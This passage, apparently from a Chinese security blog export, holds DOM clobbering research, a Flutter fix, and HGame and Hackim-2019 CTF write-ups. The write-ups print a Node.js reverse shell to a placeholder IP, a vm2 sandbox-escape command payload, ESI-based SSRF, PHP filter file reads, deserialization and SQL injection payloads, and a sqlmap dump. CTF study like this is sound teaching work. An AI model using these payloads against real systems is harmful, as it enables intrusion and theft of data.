\"nobr\", \"noembed\", \"noframes\", \"noscript\", \"object\", \"ol\", \"optgroup\", \"option\", \"output\", \"p\", \"param\", \"picture\", \"plaintext\", \"pre\", \"progress\", \"q\", \"rb\", \"rp\", \"rt\", \"rtc\", \"ruby\", \"s\", \"samp\", \"script\",&nbsp;…] Window &amp; Name1window.x == document.getElementsByName(\"x\")[0] &amp;&amp; window.x != undefined 这里与 document 一致，只有五个标签可以让window通过 name 进行直接获取 1&nbsp;[\"embed\", \"form\", \"image\", \"img\", \"object\"] ‘Not Clobbered’1[\"body\", \"caption\", \"col\", \"colgroup\", \"frame\", \"frameset\", \"head\", \"html\", \"tbody\", \"td\", \"tfoot\", \"th\", \"thead\", \"tr\"] PS: 这部分并不是真正不能 Clobbered ，因为比如说body，因为我本身界面存在一个body标签，只是在我测试构建的简单的 HTML 页面中，这些标签不能被 Clobbered ，而且在实际中也用到比较少。并且根据 Chromium 中的说法是”but anything by id”，所以如果需要通过Window.id的形式去获取标签的话，还有很多标签可以使用，或者也可以尽力去构建下文的要求。 Dom Doc其实在 Dom 标准中也有提及过这部分，在A part of Document interface 这一段中，我们可以看到有相关规定： ​ The Document interface supports named properties. The supported property names of a Document object document at any moment consist of the following, in tree order according to the element that contributed them, ignoring later duplicates, and with values from id attributes coming before values from name attributes when the same element contributes both: the value of the name content attribute for all exposed embed, form, iframe, img, and exposed object elements that have a non-empty name content attribute and are in a document tree with document as their root; the value of the id content attribute for all exposed object elements that have a non-empty id content attribute and are in a document tree with document as their root; and the value of the id content attribute for all img elements that have both a non-empty id content attribute and a non-empty name content attribute, and are in a document tree with document as their root. 也有关于 Window 对象的部分： ​ The Window object supports named properties. The supported property names of a Window object window at any moment consist of the following, in tree order according to the element that contributed them, ignoring later duplicates: window’s document-tree child browsing context name property set; the value of the name content attribute for all embed, form, img, and object elements that have a non-empty name content attribute and are in a document tree with window’s associated Document as their root; and the value of the id content attribute for all HTML elements that have a non-empty id content attribute and are in a document tree with window’s associated Document as their root. Window关于 window 对象，虽然 window 对象可以通过 id 直接获取标签，但是我目前还没发现可以直接通过标签 id 进行 clobber 的属性，毕竟是基于 Dom 的攻击技术。 Document至于 Document 对象，我列举了一下 Document 对象特有的属性以及其对应的类型： Class Attr DOMImplementation [“implementation”] HTMLCollection [“images”, “embeds”, “plugins”, “links”, “forms”, “scripts”, “anchors”, “applets”, “children”] String [“documentURI”, “compatMode”, “characterSet”, “charset”, “inputEncoding”, “contentType”, “domain”, “referrer”, “cookie”, “lastModified”, “readyState”, “title”, “dir”, “designMode”, “fgColor”, “linkColor”, “vlinkColor”, “alinkColor”, “bgColor”, “visibilityState”, “webkitVisibilityState”, “nodeName”, “baseURI”] HTMLBodyElement [“body”, “activeElement”] HTMLHeadElement [“head”] HTMLScriptElement [“currentScript”] HTMLAllCollection [“all”] NodeList [“childNodes”] Window [“defaultView”] DocumentType [“doctype”, “firstChild”] Boolean [“xmlStandalone”, “hidden”, “wasDiscarded”, “webkitHidden”, “fullscreenEnabled”, “fullscreen”, “webkitIsFullScreen”, “webkitFullscreenEnabled”, “pictureInPictureEnabled”, “isConnected”] FontFaceSet [“fonts”] StyleSheetList [“styleSheets”] Function [“getElementsByTagName”, “getElementsByTagNameNS”, “getElementsByClassName”, “createDocumentFragment”, “createTextNode”, “createCDATASection”, “createComment”, “createProcessingInstruction”, “importNode”, “adoptNode”, “createAttribute”, “createAttributeNS”, “createEvent”, “createRange”, “createNodeIterator”, “createTreeWalker”, “getElementsByName”, “write”, “writeln”, “hasFocus”, “execCommand”, “queryCommandEnabled”, “queryCommandIndeterm”, “queryCommandState”, “queryCommandSupported”, “queryCommandValue”, “clear”, “exitPointerLock”, “createElement”, “createElementNS”, “caretRangeFromPoint”, “elementFromPoint”, “elementsFromPoint”, “getElementById”, “prepend”, “append”, “querySelector”, “querySelectorAll”, “exitFullscreen”, “webkitCancelFullScreen”, “webkitExitFullscreen”, “createExpression”, “createNSResolver”, “evaluate”, “registerElement”, “exitPictureInPicture”, “hasChildNodes”, “getRootNode”, “normalize”, “cloneNode”, “isEqualNode”, “isSameNode”, “compareDocumentPosition”, “contains”, “lookupPrefix”, “lookupNamespaceURI”, “isDefaultNamespace”, “insertBefore”, “appendChild”, “replaceChild”, “removeChild”] NodeList [“childNodes”] Array [“adoptedStyleSheets”] FeaturePolicy [“featurePolicy”] Null [“xmlEncoding”, “xmlVersion”, “onreadystatechange”, “onpointerlockchange”, “onpointerlockerror”, “onbeforecopy”, “onbeforecut”, “onbeforepaste”, “onfreeze”, “onresume”, “onsecuritypolicyviolation”, “onvisibilitychange”, “oncopy”, “oncut”, “onpaste”, “pointerLockElement”, “fullscreenElement”, “onfullscreenchange”, “onfullscreenerror”, “webkitCurrentFullScreenElement”, “webkitFullscreenElement”, “onwebkitfullscreenchange”, “onwebkitfullscreenerror”, “rootElement”, “pictureInPictureElement”, “ownerDocument”, “parentNode”, “parentElement”, “previousSibling”, “nextSibling”, “nodeValue”, “textContent”] 其中，HTMLBodyElement/HTMLHeadElement/HTMLScriptElement 均继承自HTMLElement，为什么需要这些呢？因为在很多时候我们 Clobber 得到的就是一个HTMLElement，而 Document 某些属性得到的也是一个HTMLElement，所以这时候我们可以直接利用。 Cause我想如果能覆盖的话，应该就是在调用document.x的时候， Dom 树解析得到的结果要优先于document自己本身属性，所以产生了这样的结果，但是这里也有一个问题，就是为什么我们在覆盖cookie的时候却不能完全控制覆盖呢？ 带着这些疑问，我特地去看了一会 chromium 的源码，简略地看了一下这些实现，主要在 chromium 的 blink 部分。由于自己知识浅薄，并没有完整地阅读过 chromium 源码，这里还可能设计到一些编译原理的知识，所以我并没有安全把整个 Chromium 产生这个问题的缘由以代码追踪的形式弄出来，如果要弄的话估计也得去 debug Chromium ，那就是另一篇文章的内容了，所以这个部分还有待继续研究，不过我把自己看的一些有用的部分写出来。如果有兴趣的朋友可以联系我一起研究看看。（虽然我很菜XD 全部代码来源于 Chomiunm Code Search，这个平台可以比较方便审代码。 Location首先我们来看看location，我们既可以使用window.location也可以使用document.location拿到location，这也能说明我们为什么上文要单独 fuzz Document 特有的属性而不是全部属性了。 在 Chromium 源码中，找到location比较简单， Chromium 直接调用了window对象的location()，所以我们就覆盖不了。 在third_party/blink/renderer/core/dom/document.cc中，第 933 行中有相关定义 Document::location() 123456Location* Document::location() const { if (!GetFrame()) return nullptr; return domWindow()-&gt;location();} 可以看到，直接调用了domWindow()来获取location，在third_party/blink/renderer/core/frame/dom_window.cc中，第85行有相关定义 DOMWindow::location() 12345Location* DOMWindow::location() const { if (!location_) location_ = MakeGarbageCollected&lt;Location&gt;(const_cast&lt;DOMWindow*&gt;(this)); return location_.Get();} 另外，有人提过相关用其他 hook 的方式 Issue 315760: document.domain can be hooked，里面提到可以 hook 到 domain 跟 location ，但是我在目前 stable chrome 上测试只能 hook 到 domain ，至于 location 不知道是不是被修了，尽管回复的是”Browsers allow hooking these properties. It doesn’t matter” Cookie这里简单看了一下 Cookie 的实现，主要是这两部分代码： Document::cookie 12345678910111213141516171819202122232425String Document::cookie(ExceptionState&amp; exception_state) const { if (GetSettings() &amp;&amp; !GetSettings()-&gt;GetCookieEnabled()) return String(); CountUse(WebFeature::kCookieGet); if (!GetSecurityOrigin()-&gt;CanAccessCookies()) { if (IsSandboxed(mojom::blink::WebSandboxFlags::kOrigin)) exception_state.ThrowSecurityError( \"The document is sandboxed and lacks the 'allow-same-origin' flag.\"); else if (Url().ProtocolIs(\"data\")) exception_state.ThrowSecurityError( \"Cookies are disabled inside 'data:' URLs.\"); else exception_state.ThrowSecurityError(\"Access is denied for this document.\"); return String(); } else if (GetSecurityOrigin()-&gt;IsLocal()) { CountUse(WebFeature::kFileAccessedCookies); } if (!cookie_jar_) return String(); return cookie_jar_-&gt;Cookies();} CookieJar::Cookies() 1234567891011String CookieJar::Cookies() { KURL cookie_url = document_-&gt;CookieURL(); if (cookie_url.IsEmpty()) return String(); RequestRestrictedCookieManagerIfNeeded(); String value; backend_-&gt;GetCookiesString(cookie_url, document_-&gt;SiteForCookies(), document_-&gt;TopFrameOrigin(), &amp;value); return value;} 以及，虽然 cookie 不能被完全字符串化控制，但是可以被 Clobbered 的问题在2年前也有人报告过这个相关的问题 document.cookie DOM property can be clobbered using DOM node named cookie 只不过目前的主流浏览器都是”Safari, Chrome and Firefox all behave the same here”。 Document Collection涉及到 Collection 的 Document 部分： DocumentNameCollection::ElementMatches 1234567891011121314151617181920bool DocumentNameCollection::ElementMatches(const HTMLElement&amp; element) const { // Match images, forms, embeds, objects and iframes by name, // object by id, and images by id but only if they have // a name attribute (this very strange rule matches IE) auto* html_embed_element = DynamicTo&lt;HTMLEmbedElement&gt;(&amp;element); if (IsA&lt;HTMLFormElement&gt;(element) || IsA&lt;HTMLIFrameElement&gt;(element) || (html_embed_element &amp;&amp; html_embed_element-&gt;IsExposed())) return element.GetNameAttribute() == name_; auto* html_image_element = DynamicTo&lt;HTMLObjectElement&gt;(&amp;element); if (html_image_element &amp;&amp; html_image_element-&gt;IsExposed()) return element.GetNameAttribute() == name_ || element.GetIdAttribute() == name_; if (IsA&lt;HTMLImageElement&gt;(element)) { const AtomicString&amp; name_value = element.GetNameAttribute(); return name_value == name_ || (element.GetIdAttribute() == name_ &amp;&amp; !name_value.IsEmpty()); } return false;} Window Collection涉及到 Collection 的 Window 部分： WindowNameCollection::ElementMatches 12345678910bool WindowNameCollection::ElementMatches(const Element&amp; element) const { // Match only images, forms, embeds and objects by name, // but anything by id if (IsA&lt;HTMLImageElement&gt;(element) || IsA&lt;HTMLFormElement&gt;(element) || IsA&lt;HTMLEmbedElement&gt;(element) || IsA&lt;HTMLObjectElement&gt;(element)) { if (element.GetNameAttribute() == name_) return true; } return element.GetIdAttribute() == name_;} BounsTip 1 Global Scope由于 Dom Clobbering 利用方式之一就是 hook 全局作用域下的变量，又由于 Javascript 是一门十分神奇的语言，所以我们需要注意如下几点 显式声明12345678&lt;script&gt; var a = 1; let b = 2; var c = function () {}; console.log(window.a); //1 console.log(window.b); //undefined console.log(window.c); //ƒ () {}&lt;/script&gt; 隐式声明1234567&lt;script&gt; function test(a){ b = a + 1; } test(1); console.log(window.b); //2&lt;/script&gt; 不带有声明关键字的变量，Javascript 会自动挂载到全局作用域上。 let &amp; varES6 中新增了let命令，用来声明变量。它的用法类似于var，但是所声明的变量，只在let命令所在的代码块内有效。详细可以参考 let 基本用法 1234567{ let a = 10; var b = 1;}a // ReferenceError: a is not defined.b // 1 上面代码在代码块之中，分别用let和var声明了两个变量。然后在代码块之外调用这两个变量，结果let声明的变量报错，var声明的变量返回了正确的值。这表明，let声明的变量只在它所在的代码块有效。 而且有些很奇妙的操作，比如： 123let a = b = 6;window.a; //undefinedwindow.b; //6 Tip 2 Overwrite function虽然可以 Clobber 函数，但是目前我没找到什么方法让他执行我们 Clobber 的结果，或者说目前貌似也没有办法通过标签来定义一个函数，所以只能是引起一个报错， 1234&lt;img id='getElementById' name='getElementById'&gt;&lt;script&gt; var a = document.getElementById('x'); //Uncaught TypeError: document.getElementById is not a function&lt;/script&gt; 虽然只能引起报错，但是在一定场景下我们可以利用这个来绕过一些判断，例如： 123456789&lt;img id='getElementById' name='getElementById'&gt;&lt;script&gt; var a = document.getElementById('x'); //Uncaught TypeError: document.getElementById is not a function //We must use sanitize a here.&lt;/script&gt;&lt;script&gt; //We have sanitized a. We can trust a now! //Do something with a.&lt;/script&gt; 第一个 JS 代码块虽然引起了报错，但是不会引起 JS 完全停止执行，JS 会跳过这个报错的代码块，执行下一个代码块。 Tip 3 Prototype Pollution原型链污染可以吗？ 我目前尝试的方法还没成功，如果师傅尝试成功了一定要跟我分享！ Defence 最简单的是判断每个变量预期的类型以避免非预期类型的篡改，例如，可以检查 Dom 节点的 attribute 属性是否实际上是 NamedNodeMap 的实例，这样可以确保该属性是一个 attributes 属性，而不是攻击者插入的 HTMLElement。 毕竟这种攻击主要出现在全局变量这一块，所以代码规范十分重要！ 使用经过测试的库，例如 DOMPurify 。 ReferencesDOM FLOW UNTANGLING THE DOM FOR EASY BUGS DOM Clobbering Attack DOM Clobbering strikes back DOM Clobbering Clobbering the clobbered — Advanced DOM Clobbering XSS in GMail’s AMP4Email via DOM Clobbering [DOM Clobbering Attack学习记录.md](https://wonderkun.cc/2020/02/15/DOM Clobbering Attack学习记录) Im DOM hört Dich keiner schreien Dec 20: Sanitising HTML – the DOM clobbering issue 谈谈 JavaScript 的作用域","link":"/2020/03/04/Dom-Clobbering/"},{"title":"Flutter packages get 424问题解决方法","text":"在我一个项目当中使用flutter packages get遇到了 HTTP 424 的错误，找了很多方法都没有解决方法，个人解决了之后就此记录下来。 问题描述使用flutter packages get -v打印出步骤错误 发现 404 错误 发现问题按照提示，使用pub --trace --verbosity=warning --verbose get --no-precompile打印出更详细的步骤 发现老是在获取path_provideer 0.5.0+1这里报出了 424 的错误，一开始以为是不是镜像并没有这个包，自己也去pub.flutter-io.cn找了一下，确实有path_provideer 0.5.0+1这个版本的包。 而 HTTP 424 代表什么呢 ​ 424 Failed Dependency (WebDAV; RFC 4918) ​ The request failed because it depended on another request and that request failed (e.g., a PROPPATCH).[15] ​ —From List of HTTP status codes 这里就是字面意思了，也就是说本次请求失败的原因是上次的请求失败了。然而搜索了相关知识，都没有找到方法。 解决方案由于毕竟是 HTTP 出了问题，那肯定是网络的问题 尝试切换代理(It works nothing for me) 尝试更换镜像源，由于自己之前设定的是 12export PUB_HOSTED_URL=https://pub.flutter-io.cnexport FLUTTER_STORAGE_BASE_URL=https://storage.flutter-io.cn 由于现在在学校，自己所处的网络环境发生了改变，毕竟教育网络内部之间的通信比较好，于是切换到交大的镜像源，问题得到解决 12export PUB_HOSTED_URL=https://dart-pub.mirrors.sjtug.sjtu.edu.cn/export FLUTTER_STORAGE_BASE_URL=https://mirrors.sjtug.sjtu.edu.cn/","link":"/2019/02/25/Flutter-424%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"},{"title":"HGame部分writeup","text":"由于水平有限，就写写自己做出来的题目。 WebLevel - week1这部分还是比较简单的说 Are you from Europe?进去一看，呀，竟然是抽SSR，看来我们这种非酋应该是没什么手气了吧。 直接看源代码，发现最后有 1eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?\"\":e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p;}('w p(){b a=l(\"8！k，j 8 o 1 m？\");5(!$(\"#4\").7()&amp;&amp;!$(\"#9\").7()){2(\"i。\");f}b 1=\"\";1+=\"\";1+=\"\";1+=\"\";1+=\"y\";1+=\"{\";1+=\"g\";1+=\"h\";1+=\"3\";1+=\"6\";1+=\"v\";1+=\"h\";1+=\"0\";1+=\"s\";1+=\"e\";1+=\"u\";1+=\"6\";1+=\"0\";1+=\"n\";1+=\"r\";1+=\"!\";1+=\"}\";5(a){$(\"#4\").d();$(\"#9\").d();2(\"t。1: \"+1)}q{2(\"x。\")}}',35,35,'|flag|alert||serv5|if|_|html|SSR|craft5|buy|var||remove||return|T||你根本不是欧洲人|你愿意献祭你全部的|欧洲人|confirm|吗||来获取|soHappy|else|E||兑换成功|N|C|function|你失去了唯一的机会|hgame'.split('|'),0,{})) 一看就是js混淆，直接丢去解密 得到 123456789101112131415161718192021222324252627282930313233343536function soHappy() { var buy = confirm(\"SSR！欧洲人，你愿意献祭你全部的 SSR 来获取 flag 吗？\"); if (!$(\"#serv5\").html() &amp;&amp; !$(\"#craft5\").html()) { alert(\"你根本不是欧洲人。\"); return } var flag = \"\"; flag += \"\"; flag += \"\"; flag += \"\"; flag += \"hgame\"; flag += \"{\"; flag += \"T\"; flag += \"h\"; flag += \"3\"; flag += \"_\"; flag += \"C\"; flag += \"h\"; flag += \"0\"; flag += \"s\"; flag += \"e\"; flag += \"N\"; flag += \"_\"; flag += \"0\"; flag += \"n\"; flag += \"E\"; flag += \"!\"; flag += \"}\"; if (buy) { $(\"#serv5\").remove(); $(\"#craft5\").remove(); alert(\"兑换成功。flag: \" + flag) } else { alert(\"你失去了唯一的机会。\") }} 得到flag special number这题一开始我还没做出来233333，果然自己还是太菜了。题目直接给出代码 123456789101112131415include_once(\"flag.php\");if(isset($_GET['key'])){ $pattern = '/^(?=.*[0-9].*)(?=.*[a-zA-Z].*).{7,}$/ '; $key = $_GET['key']; if(preg_match($pattern,$key)===0){ echo \"格式错误\"; }else{ $lock=\"******************\"; $b = json_decode($key); if($b==$lock) echo $flag; else echo \"this is no special number\"; }} 这题便是一个php弱相等的题，这个正则就是一串数字跟字母于是便想到了比较经典的0e试了一下key=0e11111111111，就过了23333. can u find me?题目很直接地提示了 1only robot know where is the flag 于是robots.txt了解一下 12User-agent: *Disallow: /f1aaaaaaaag.php 这就没什么意思了。。 结果还没完，心里又一高兴 1only admin can get flag 看到Cookie 1Cookie:user=guest js修改cookie了解一下，然后拿到flag tell me what you want根据提示输入flag 1request method is error.I think POST is better 很明显的提示，然后改成POST发包，body为want=flag 得到Response: 12https://www.wikiwand.com/en/X-Forwarded-Foronly localhost can get flag 在修改请求头X-Forwarded-For为127.0.0.1 得到Rep: 12&lt;br/&gt;https://www.wikiwand.com/en/User_agent&lt;br/&gt;please use Icefox/57.0 这个就不能直接修改ua为Icefox/57.0了，得带上普通浏览器的ua，随便拿个firefox的ua进行修改 123Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0改成Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Icefox/57.0 得到Rep: 12&lt;br/&gt;https://www.wikiwand.com/en/HTTP_referer&lt;br/&gt;the requests should referer from www.google.com 再改请求头Referer:www.google.com 得到Rep: 12&lt;br/&gt;https://www.wikiwand.com/en/HTTP_cookie&lt;br/&gt;you are not admin 又得来修改cookie了…查看Cookie直接发现有个isadmin=0，那就改成1就好了，最后得到flag 我们不一样12345678910include_once(\"flag.php\");if(isset($_POST['str1'])&amp;&amp;isset($_POST['str2'])){ if ($_POST['str1']!=$_POST['str2']&amp;&amp;strcmp($_POST['str1'],$_POST['str2'])==0) { echo \"flag is:\".$flag; exit(); } else{ echo \"Something wrong..\"; }} 一看又是一题php弱相等，考察strcmp，只要其中一个为数组就好 1str1=0&amp;str2[]=0 得到flag Level - week2Random?打开地址啥都没有，一开始没什么思路，后来经过大师傅提醒，才注意到题目描述中说了 1多random几次没准就随机到一样的值呢 PS:网不好vim线上改代码真是致命 既然是提到了vim改代码，那就可能会有源码泄露，vim的编辑临时文件为.random.php.swp 果然得到一个.swp文件，但是在windows下是看不了的。于是拖到了kali里面用vim恢复原始文件 把.swp文件放到随便一个目录下，然后用 1$ vim -r random.php 便可直接恢复random.php文件 看到源代码 1234567891011121314151617181920212223&lt;?phperror_reporting(0);include ('flag.php');class emmm{ var $public; var $secret;}if ($_GET['emmm']) { $emmm = unserialize($_GET['emmm']); if (!is_object($emmm)) { die(\"error\"); } $emmm-&gt;public = random_int(0, 100000000); $emmm-&gt;secret = random_int(0, 100000000); if ($emmm-&gt;public == $emmm-&gt;secret) { echo $flag; }}#highlight_file(__FILE__); 发现还是一个反序列化的题，这题弄了挺久没弄出来，还是参考了一下其他小伙伴的做法 总之按照题目意思，就是得使得emmm的public与secret相等，那就构造一个实例化对象，让他们的public与secret相等就好了，注意一下相等时候要有&amp; 123$a = new emmm();$a-&gt;public = &amp;$a-&gt;secret;echo serialize($a); 得到payload: 1emmm=O:4:\"emmm\":2:{s:6:\"public\";N;s:6:\"secret\";R:2;} 拿到flag 草莓社区-2不知道是不是题目的问题show_maopian.php?mao=2.jpg竟然不能显示图片… 然后发现竟然可以有/etc/passwd，但是没有拿到/etc/shadow，也就拿不到服务器 题目提示flag在../flag.php，又不能直接访问，那就用php伪协议试试 1show_maopian.php?mao=php://filter/read=convert.base64-encode/resource=../flag.php 得到 1PD9waHAKCSRmbGFnPSJoZ2FtZXshbTRvX3BpNG5fQ2hhT19oYW9fa2FuIX0iOwo= 解码便得到flag 草莓社区-1也不知道出题人怎么想的，这题简单得多，但是顺序放在了2下面，这次是show_maopian.php?mao=1.jpg和show_maopian.php?mao=1.jpg都可以读到图片，那就根据题目提示直接试试读一下../flag.php，直接拿到flag…2333 xss-1 &amp; xss-2接下来的这两个题就没怎么去做了，而且题目要求:payload需要在chrome和firefox上都能使用，且不能有交互。感觉挺难的，就没花时间弄了 记录一下题目以后看看（虽然极有可能不会去看…） 1234567891011121314151617181920xss-1function charge(input) { input = input.replace(/script/gi, '_');trueinput = input.replace(/image/gi, '_');trueinput = input.replace(/\\(/, '_'); return '&lt;article&gt;' + input + '&lt;/article&gt;';}xss-2function charge(input) { input = input.replace(/script/gi, '_'); input = input.replace(/img/gi, '_'); input = input.replace(/image/gi, '_'); input = input.replace(/\\(/, '_'); input = input.replace(/\\&gt;/,'_'); return '&lt;input value=\"' + input + '\" type=\"text\"&gt;'; } 最简单的sql题还真是最简单的… 1payload: username=admin%27+or+1%3D1+%23&amp;pwd=1 Level - week3正常的SQLi这题我还没做出来，页面显示 12因为出题人太懒了，所以现在没有任何功能hello guest 提示也没那么明显，有判断guest，发现Cookie里有name=Z3Vlc3Q%3D; isadmin=0，那就改改，然后发现没什么用 没什么头绪就扫扫，然后发现有备份.bak文件，下载后发现源码 12345678910111213141516&lt;?php.....$username = base64_decode($_COOKIE['name']);.....$sql = \"select * from user where username = '{$username}'\";$re = mysqli_query($conn, $sql);$rs = mysqli_fetch_array($re);// echo $rs['flag'];echo $username . '&lt;br/&gt;';echo \"因为出题人太懒了，所以现在没有任何功能\";..... 送分的SQLi输入admin提示 12Warning: mysqli_num_rows() expects parameter 1 to be mysqli_result, boolean given in /home/hctfgame/week3/sqli2/index.php on line 8Unknown column 'admin' in 'where clause' 自己手注还不是很厉害，还是用sqlmap吧23333(sqlmap真是太强大了orz) 既然有了mysql的报错，那就可以省掉判断数据库的步骤了 123456789101112131415161718192021222324252627282930313233343536373839$ sqlmap -u \"http://118.25.18.223:10068/?id=1\" --level 3 --dbms mysql --dbsavailable databases [3]:[*] information_schema[*] test[*] week3_sqliiii2$ sqlmap -u \"http://118.25.18.223:10068/?id=1\" --level 3 --dbms mysql -D week3_sqliiii2 --tablesDatabase: week3_sqliiii2[2 tables]+----------+| f111aa4g || users |+----------+$ sqlmap -u \"http://118.25.18.223:10068/?id=1\" --level 3 --dbms mysql -D week3_sqliiii2 -T f111aa4g --columnsDatabase: week3_sqliiii2Table: f111aa4g[3 columns]+---------------+----------+| Column | Type |+---------------+----------+| dajiangyoude | char(20) || f111aaaggg_w3 | char(40) || id | int(11) |+---------------+----------+$ sqlmap -u \"http://118.25.18.223:10068/?id=1\" --level 3 --dbms mysql -D week3_sqliiii2 -T f111aa4g -C \"dajiangyoude,f111aaaggg_w3,id\" --dumpDatabase: week3_sqliiii2Table: f111aa4g[1 entry]+---------------+-----------------------------------+-------+| dajiangyoude | f111aaaggg_w3 | id |+---------------+-----------------------------------+-------+| kan_wo_gan_ma | hgame{Th3_e4sist_sql_injeCti0n##} | 10086 |+---------------+-----------------------------------+-------+ 拿到flag MiscLevel - week1白菜1题目提示LSB，那就去看看吧 根据CTF wiki的提示操作得到flag 白菜21234567$ binwalk misc2.jpg DECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 JPEG image data, JFIF standard 1.011037199 0xFD38F Zip archive data, at least v2.0 to extract, compressed size: 41, uncompressed size: 39, name: flag.txt1037368 0xFD438 End of Zip archive 发现有zip 1$ dd if=misc2.jpg of=misc2.rar bs=1 skip=1037199 直接dd提出rar得到里面的flag pacp1看到最后有一个GET /flag.php的请求。追踪一下即可得到flag CryptoLevel - week1easy Caesar1vuoas{Hvs_ei8qy_pf7kb_1l_xIadg_cjSf_o_Zo9m_rCu} 凯撒加密。没什么好说的 Hill1Not hard key：9 17 6 5 Ciphertext：phnfetzhzzwz 懒得解了… Polybius1FDXDGDADDG_FXXFAAXFAG_GDFXFFXFFXADXFDA_GDAD 根据题目，感觉像是ADFGVX密码。 1orjtz_nebel_jnsented_jt confusion1--/.-./.-../-/-.-/-..../-.-/-..-/-./...-/--../-..-/--.-/.--/-.../.../-./.-/..---/..-./.../..-/..---/--./--./-.../.../.--/....-/...../-.../.../.-../.-/--../..-./..-/-..../.../...-/.---/-.../-./-../.-/--../.../.-./..../..-/-..../--.-/-...-/-...-/-...-/-...- 摩斯电码，解得 1MRLTK6KXNVZXQWBSNA2FSU2GGBSW45BSLAZFU6SVJBNDAZSRHU6Q==== base32再解得 1dW5yWmsxX2h4YSF0ent2X2ZzUHZ0fQ== base64再解得 1unrZk1_hxa!tz{v_fsPvt} rot13再解得 1haeMx1_ukn!gm{i_sfCig} 最后用栅栏解得到flag baby step12pow(0x1111111111,flag,0x976693344d) = 0x7ac21f64ed结果转换成5字节可见字符","link":"/2018/03/15/HGame%E9%83%A8%E5%88%86writeup/"},{"title":"Hackim-2019 Web 记录","text":"​ 文章首发于安全客，地址：https://www.anquanke.com/post/id/170708 过年前做了一下，感觉还是挺有意思的。比赛官方也开源了比赛源码。 [TOC] WebBabyJS ​ Run your javascript code inside this page and preview it because of hackers we have only limited functions 题目内容如上，比较简单的 javascript 代码运行，后台是 Node.js 这里我们可以考虑一下是不是有什么 Node.js 沙箱逃逸什么的操作，国内对于 Node.js 沙箱逃逸的文章还是比较少的，参考了好几篇都是翻译文章，都翻译得不是很清楚，参考文章：NodeJS沙盒逃逸研究 但是也能知道个大概，要执行命令或者反弹 shell 就需要用到两个模块，分别是 net 和 child_process ，可以用以下 payload 直接反弹 shell 123456789101112(function () { var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []); var client = new net.Socket(); client.connect(your_port, \"your_ip\", function () { client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; // Prevents the Node.js application form crashing})(); 然而当我们想直接反弹 shell （那当然是太天真了），就返回了not defined 所以没那么简单，那我们先从信息收集开始，使用Error().stack可以收集使用的模块信息，而且题目设置是可以直接把内容输出出来的，所以我们不需要print，可以直接输出信息。 我们首先先收集目标信息，使用js=Error().stack 我们可以得到题目设置的模块，如vm.js，然后发现对应的vm2仓库里已经有很多 escape 的 issue 了，发现有一位 @XmiliaH 大佬已经 escape 了很多版本，我们可以尝试一下比较新的一个版本Breakout in v3.6.9 12345678910111213141516var process;try{Object.defineProperty(Buffer.from(\"\"),\"\",{truevalue:new Proxy({},{truetruegetPrototypeOf(target){truetruetrueif(this.t)truetruetruetruethrow Buffer.from;truetruetruethis.t=true;truetruetruereturn Object.getPrototypeOf(target);truetrue}true})});}catch(e){trueprocess = e.constructor(\"return process\")();}process.mainModule.require(\"child_process\").execSync(\"ls\").toString() 直接作为 payload 使用，发现可以成功执行命令 接下来直接读 flag 就好了，得到 1hackim19{S@ndbox_0_h4cker_1} Blog ​ Its just a blog 题目是一个 Node.js ，题目设置比较简单，就一个表单，提交之后参数会得到相应的页面 以及还有一个 admin 界面 index 界面输入什么就以 HTML 形式返回什么，也可以触发 XSS 但是这只是一个 self-xss ，这就显得又些鸡肋了，所以大概意思就是我们需要用 index 做 xss 或者其他一些操作去获取管理员权限 跟上题一样，既然都是 Node.js ，是不是也可以得到一些错误信息什么的。 在尝试了一些单引号、双引号等一些特殊符号，发现确实是全部都转换成 string 输出了，猜想是不是有类似toString()的操作，换成数组测试，发现无回显，一直停留在 pending 状态中 尝试直接访问 /edge 页面，得到错误信息 但是这都是用于前端效果的 js 库，并没有什么用，但是思路应该是没错的，继续 fuzz 就行了。 最终用title=1&amp;description[a]=1得到了比较有用的报错信息，得到了一个新的库 esi.js ，查看相关资料Node ESI Language parser，可以知道这是一个用于处理 ESI 语言的 js 库，使用示例官方也给出来了 ​ You want to embed the fragment of HTML from “http://snipets.com/abc.html\" within an HTML document. 12blah blah, oh and here i embed in the page a snipet using an ESI server ...&lt;esi:include src=\"http://snipets.com/snipet.html\"&gt;&lt;/esi:include&gt; snipet.html 1&lt;b&gt;Snipet&lt;/b&gt; With Node ESI script, you can pre-process ESI tags. 看到这里我们的思路就比较清晰，就是以 esi 的方式去访问 admin 页面就可以了，相当于形成了一个 SSRF 。 12payload:title=1&amp;description=&lt;esi%3Ainclude+src%3D\"http%3A%2F%2Fwebsite.com%2Fadmin\"&gt;&lt;%2Fesi%3Ainclude&gt; mime checkr ​ upload and check the mime type Hint1: Do you think containers could speak like humans? 题目设置为有一个上传点，只允许上传 .jpeg 后缀的文件，尝试了一下其他截断，均不能上传其他文件 还有一个获取 MIME 格式的功能，需要传入路径，返回 MIME 格式 还有一个备份文件getmime.bak 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?php//error_reporting(-1);//ini_set('display_errors', 'On');class CurlClass{ public function httpGet($url) { $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);// curl_setopt($ch,CURLOPT_HEADER, false); $output=curl_exec($ch); curl_close($ch); return $output; }}class MainClass {truepublic function __destruct() { $this-&gt;why =new CurlClass; echo $this-&gt;url; echo $this-&gt;why-&gt;httpGet($this-&gt;url);true}}// Check if image file is a actual image or fake imageif(isset($_POST[\"submit\"])) { $check = getimagesize($_POST['name']); if($check !== false) { echo \"File is an image - \" . $check[\"mime\"] . \".\"; $uploadOk = 1; } else { echo \"File is not an image.\"; $uploadOk = 0; }}?&gt; 